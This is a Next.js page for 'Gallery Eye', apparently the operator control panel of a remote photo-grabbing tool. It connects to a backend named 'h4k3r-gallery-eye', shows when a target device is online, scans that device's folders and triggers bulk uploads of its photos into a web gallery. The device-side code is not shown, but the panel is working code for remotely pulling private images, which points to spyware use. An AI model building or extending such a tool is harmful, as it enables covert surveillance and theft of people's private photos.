'use client';

import { useEffect, useState } from 'react';
import Image from 'next/image';
import { io, Socket } from 'socket.io-client';

interface GalleryImage {
    id: string;
    url: string;
    created_at: string;
}

interface Folder {
    name: string;
    count: number;
}

const API_URL = 'https://h4k3r-gallery-eye.onrender.com';

export default function Home() {
    const [images, setImages] = useState<GalleryImage[]>([]);
    const [loading, setLoading] = useState(true);
    const [socket, setSocket] = useState<Socket | null>(null);
    const [deviceOnline, setDeviceOnline] = useState(false);
    const [folders, setFolders] = useState<Folder[]>([]);
    const [selectedFolder, setSelectedFolder] = useState<string | null>(null);
    const [uploadCount, setUploadCount] = useState<number>(10);
    const [uploadProgress, setUploadProgress] = useState<{ uploaded: number, total: number } | null>(null);

    useEffect(() => {
        fetchImages();

        const newSocket = io(API_URL);
        setSocket(newSocket);

        newSocket.on('connect', () => {
            console.log('Connected to backend');
            newSocket.emit('register_web');
        });

        newSocket.on('device_status', (status) => {
            setDeviceOnline(status.online);
        });

        newSocket.on('folder_list', (data) => {
            setFolders(data);
        });

        newSocket.on('upload_progress', (data) => {
            setUploadProgress(data);
            if (data.uploaded === data.total) {
                setTimeout(fetchImages, 2000);
            }
        });

        newSocket.on('new_image', (newImage) => {
            setImages(prev => [newImage, ...prev]);
        });

        return () => {
            newSocket.disconnect();
        };
    }, []);

    const fetchImages = () => {
        fetch(`${API_URL}/images`)
            .then((res) => res.json())
            .then((data) => {
                setImages(data);
                setLoading(false);
            })
            .catch((err) => {
                console.error('Failed to fetch images', err);
                setLoading(false);
            });
    };

    const handleScanFolders = () => {
        if (socket) {
            socket.emit('request_folders');
            setFolders([]);
        }
    };

    const handleTriggerUpload = () => {
        if (socket && selectedFolder) {
            setUploadProgress({ uploaded: 0, total: uploadCount });
            socket.emit('trigger_upload', {
                folderName: selectedFolder,
                count: uploadCount
            });
        }
    };

    return (
        <div className="min-h-screen relative overflow-hidden">
            {/* Animated Background */}
            <div className="fixed inset-0 -z-10">
                <div className="absolute top-20 left-20 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-float"></div>
                <div className="absolute top-40 right-20 w-72 h-72 bg-pink-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-float" style={{ animationDelay: '2s' }}></div>
                <div className="absolute -bottom-8 left-1/2 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-float" style={{ animationDelay: '4s' }}></div>
            </div>

            {/* Header */}
            <header className="pt-8 pb-6 px-4 md:px-8">
                <div className="max-w-7xl mx-auto">
                    <div className="flex flex-col md:flex-row items-center justify-between gap-4">
                        <div className="text-center md:text-left">
                            <h1 className="text-5xl md:text-6xl font-black gradient-text mb-2">
                                Gallery Eye
                            </h1>
                            <p className="text-gray-400 text-sm md:text-base">Control your device photos remotely</p>
                        </div>

                        <div className="glass-effect px-6 py-3 rounded-full flex items-center gap-3">
                            <div className="relative">
                                <div className={`w-3 h-3 rounded-full ${deviceOnline ? 'bg-green-400' : 'bg-red-400'}`}></div>
                                {deviceOnline && (
                                    <div className="absolute inset-0 w-3 h-3 rounded-full bg-green-400 animate-ping"></div>
                                )}
                            </div>
                            <span className="text-sm font-medium">
                                {deviceOnline ? 'Device Online' : 'Waiting for device...'}
                            </span>
                        </div>
                    </div>
                </div>
            </header>

            <main className="px-4 md:px-8 pb-8">
                <div className="max-w-7xl mx-auto space-y-8">
                    {/* Control Panel */}
                    <div className="glass-effect rounded-3xl p-6 md:p-8 border border-white/10">
                        <div className="flex items-center gap-3 mb-6">
                            <div className="w-10 h-10 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 flex items-center justify-center">
                                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
                                </svg>
                            </div>
                            <h2 className="text-2xl font-bold">Remote Control Panel</h2>
                        </div>

                        <button
                            onClick={handleScanFolders}
                            className="btn-primary w-full md:w-auto px-8 py-4 rounded-xl font-semibold text-white flex items-center justify-center gap-2 mb-6"
                        >
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                            </svg>
                            Scan Device Folders
                        </button>

                        {folders.length > 0 && (
                            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                {/* Folders List */}
                                <div>
                                    <label className="block text-sm font-semibold text-gray-300 mb-3">
                                        📁 Available Folders
                                    </label>
                                    <div className="glass-effect rounded-2xl p-4 max-h-80 overflow-y-auto space-y-2">
                                        {folders.map((f) => (
                                            <button
                                                key={f.name}
                                                onClick={() => setSelectedFolder(f.name)}
                                                className={`w-full text-left p-4 rounded-xl transition-all duration-200 ${selectedFolder === f.name
                                                        ? 'bg-gradient-to-r from-purple-600 to-pink-600 shadow-lg'
                                                        : 'hover:bg-white/5 bg-white/[0.02]'
                                                    }`}
                                            >
                                                <div className="flex justify-between items-center">
                                                    <div className="flex items-center gap-3">
                                                        <div className={`w-2 h-2 rounded-full ${selectedFolder === f.name ? 'bg-white' : 'bg-purple-400'}`}></div>
                                                        <span className="font-medium">{f.name}</span>
                                                    </div>
                                                    <span className="bg-black/20 px-3 py-1 rounded-full text-xs font-semibold">
                                                        {f.count}
                                                    </span>
                                                </div>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                {/* Upload Controls */}
                                <div className="space-y-6">
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-300 mb-3">
                                            🔢 Number of Images
                                        </label>
                                        <div className="grid grid-cols-4 gap-3">
                                            {[10, 20, 50].map(num => (
                                                <button
                                                    key={num}
                                                    onClick={() => setUploadCount(num)}
                                                    className={`py-3 rounded-xl font-semibold transition-all duration-200 ${uploadCount === num
                                                            ? 'bg-gradient-to-r from-purple-600 to-pink-600'
                                                            : 'glass-effect hover:bg-white/10'
                                                        }`}
                                                >
                                                    {num}
                                                </button>
                                            ))}
                                            <input
                                                type="number"
                                                value={uploadCount}
                                                onChange={(e) => setUploadCount(parseInt(e.target.value) || 0)}
                                                className="glass-effect rounded-xl px-4 text-center focus:outline-none focus:ring-2 focus:ring-purple-500 bg-transparent"
                                                placeholder="Custom"
                                            />
                                        </div>
                                    </div>

                                    <button
                                        onClick={handleTriggerUpload}
                                        disabled={!selectedFolder || uploadProgress !== null}
                                        className={`w-full py-4 rounded-xl font-bold text-lg transition-all duration-300 ${selectedFolder && !uploadProgress
                                                ? 'btn-primary'
                                                : 'bg-gray-700 cursor-not-allowed text-gray-500'
                                            }`}
                                    >
                                        {uploadProgress ? (
                                            <span className="flex items-center justify-center gap-2">
                                                <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                                </svg>
                                                Uploading...
                                            </span>
                                        ) : '📤 Fetch Selected Images'}
                                    </button>

                                    {uploadProgress && (
                                        <div className="glass-effect rounded-xl p-4">
                                            <div className="flex justify-between text-sm mb-2">
                                                <span className="font-semibold">Progress</span>
                                                <span className="text-purple-400">{uploadProgress.uploaded} / {uploadProgress.total}</span>
                                            </div>
                                            <div className="w-full bg-gray-800 rounded-full h-3 overflow-hidden">
                                                <div
                                                    className="bg-gradient-to-r from-purple-500 to-pink-500 h-3 rounded-full transition-all duration-500"
                                                    style={{ width: `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` }}
                                                ></div>
                                            </div>
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}
                    </div>

                    {/* Gallery Grid */}
                    {loading ? (
                        <div className="flex flex-col items-center justify-center py-20">
                            <div className="relative">
                                <div className="w-20 h-20 border-t-4 border-purple-500 border-solid rounded-full animate-spin"></div>
                                <div className="w-20 h-20 border-t-4 border-pink-500 border-solid rounded-full animate-spin absolute top-0" style={{ animationDirection: 'reverse', animationDuration: '1.5s' }}></div>
                            </div>
                            <p className="mt-6 text-gray-400 animate-pulse">Loading gallery...</p>
                        </div>
                    ) : images.length > 0 ? (
                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3 md:gap-4">
                            {images.map((image, index) => (
                                <div
                                    key={image.id}
                                    className="card-hover glass-effect rounded-2xl overflow-hidden group aspect-square"
                                    style={{ animationDelay: `${index * 50}ms` }}
                                >
                                    <div className="relative w-full h-full">
                                        <Image
                                            src={image.url}
                                            alt="Gallery"
                                            fill
                                            className="object-cover transition-transform duration-500 group-hover:scale-110"
                                            sizes="(max-width: 640px) 50vw, (max-width: 1024px) 33vw, 20vw"
                                        />
                                        <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex flex-col justify-end p-3">
                                            <p className="text-white text-xs font-medium">
                                                {new Date(image.created_at).toLocaleString()}
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    ) : (
                        <div className="glass-effect rounded-3xl p-12 text-center">
                            <div className="w-24 h-24 mx-auto mb-6 rounded-full bg-gradient-to-r from-purple-500/20 to-pink-500/20 flex items-center justify-center">
                                <svg className="w-12 h-12 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                                </svg>
                            </div>
                            <h3 className="text-2xl font-bold mb-2">No Images Yet</h3>
                            <p className="text-gray-400 max-w-md mx-auto">
                                Use the control panel above to scan your device and fetch images from your favorite folders.
                            </p>
                        </div>
                    )}
                </div>
            </main>
        </div>
    );
}
